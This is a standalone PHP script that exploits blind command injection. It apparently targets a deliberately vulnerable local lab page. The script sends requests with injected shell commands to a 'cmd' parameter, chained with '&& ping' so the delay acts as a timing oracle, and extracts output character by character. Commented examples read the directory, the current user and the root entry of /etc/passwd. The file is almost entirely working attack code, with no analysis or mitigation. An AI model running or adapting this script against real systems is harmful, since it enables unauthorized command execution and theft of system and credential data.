<?php
set_time_limit(0);

$realtime = true;
$reprint = false;

function timed_post_request($url, $fields)
{
	$fields_string = '';
	foreach($fields as $key=>$value) { $fields_string .= $key.'='.$value.'&'; }
	rtrim($fields_string,'&');

	$temp = explode(' ', microtime());
	$start = $temp[1] + $temp[0];

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, count($fields));
	curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$result = curl_exec($ch);

	$temp = explode(' ', microtime());
	$finish = $temp[1] + $temp[0];

	return round(($finish - $start), 4);
}

function do_brute($url, $key, $value, $charset, $discovered='')
{
	global $realtime;
	global $reprint;

	$return = [];

	/* add a new character to test for */
	foreach (array_unique(str_split($charset)) as $char)
	{
		/* inject our bruteforce attempt and build request parameters */
		$fields[$key] = urlencode(str_replace('{BRUTEME}', $discovered.$char, $value));
		$time = timed_post_request($url, $fields);

		/* time based logic */
		if ($time > 0.5)
		{
			if ($realtime)
			{
				/* real-time output */
				if ($reprint)
				{
					echo $discovered;
					$reprint = false;
				}
				echo $char;
				flush();
				ob_flush();
			}

			/* collect and buble-up any results */
			$results = do_brute($url, $key, $value, $charset, $discovered.$char);
			$return = array_merge($return, $results);

			/* if we can't find any more "children" results, assume this was it? */
			/* TODO: find a fix for similarly named files going missing (eg: "test.php" and "test.phps") */
			if (count($return) == 0)
			{
				$return[] = $discovered.$char;
				if ($realtime)
				{
					echo '<br>';
					$reprint = true;
				}
			}
		}
	}
	return $return;
}

echo '<h1>Started!</h1>';

/* EXAMPLES: */

$key = 'cmd'; // parameter name
$url = 'http://localhost/cmd_injection/vulnerable.php';

/* enumerate files in current directory */
$value = 'ls {BRUTEME}* && ping -c 2 127.0.0.1';
$charset = 'abcdefghijklmnopqrstuvwxyz1234567890-_=.';

/* retrieve current working directory */
// $value = 'pwd | grep "^{BRUTEME}" && ping -c 3 127.0.0.1';
// $charset = 'abcdefghijklmnopqrstuvwxyz1234567890-_=/';

/* retrieve "whoami" */
// $value = 'whoami | grep "^{BRUTEME}" && ping -c 3 127.0.0.1';
// $charset = 'abcdefghijklmnopqrstuvwxyz1234567890-_=/';

/* get "root" entry from passwd file */
// $value = 'cat /etc/passwd | grep root | grep "^{BRUTEME}" && ping -c 3 127.0.0.1';
// $charset = 'abcdefghijklmnopqrstuvwxyz1234567890-_=/:';

$results = do_brute($url, $key, $value, $charset, $discovered='');

echo '<pre>';
print_r($results);
?>